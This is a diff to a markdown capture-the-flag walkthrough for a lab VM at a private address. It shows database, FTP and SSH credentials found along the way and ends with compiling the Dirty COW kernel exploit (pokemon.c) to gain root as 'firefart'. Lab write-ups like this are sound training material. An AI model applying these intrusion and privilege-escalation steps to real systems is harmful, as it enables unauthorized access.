@@ -82,7 +82,7 @@ Best regards.
 Find the password and login for the database ``login: root`` and ``password: Fg-'kKXBj87E:aJ$``
 
 ## Attempt to login phpmyadmin.
-Follow thi link ``https://172.16.101.128/phpmyadmin/``
+Follow the link ``https://172.16.101.128/phpmyadmin/``
 
 With login and password we enter in the database.
 
@@ -98,7 +98,9 @@ Script created a new template for the link ``https://172.16.101.128/forum/templa
 
 ## Attempt to connect by ftp.
 ``ftp 172.16.101.128``
+
 ``login: lmezard``
+
 ``password: G!@M6f4Eatau{sF"``
 
 Login was successful, checking the directory:
@@ -116,7 +118,9 @@ We receive the whole folder with different files. When viewing each file, we rec
 
 We use a small script that will collect everything from the files, sort it and then create a new main.c file.
 ``python unpack.py``
+
 ``gcc main.c``
+
 ``./a.out``
 
 After run we get:
@@ -126,25 +130,33 @@ Now SHA-256 it and submit
 ``
 
 Encrypt it in SHA-256 and get:
+
 ``330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4``
 ## Attempt to login via ssh.
 ``ssh laurie@172.16.101.128``
+
 ``login: laurie``
+
 ``password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4``
 
 Login was success.
 
 Now we need to find out what kind of server it is to correctly google exploit for root.
+
 ``uname -r`` -> 3.2.0-91-generic-pae
 ``cat /etc/*-release`` -> DISTRIB_DESCRIPTION="Ubuntu 12.04.5 LTS"
-
 With the obtained data, we do a search in Google and find this [link](https://www.exploit-db.com/exploits/40839).
 
 Create this script on the server, we did it through vim.
+
 ``touch pokemon.c``
+
 ``vim pokemon.c`` -> ``CMD + C`` -> ``CMD + V``
+
 ``gcc -pthread pokemon.c -o dirty -lcrypt && ./dirty``
+
 Now we set some password.
+
 ``su firefart``
 # U are root.
 
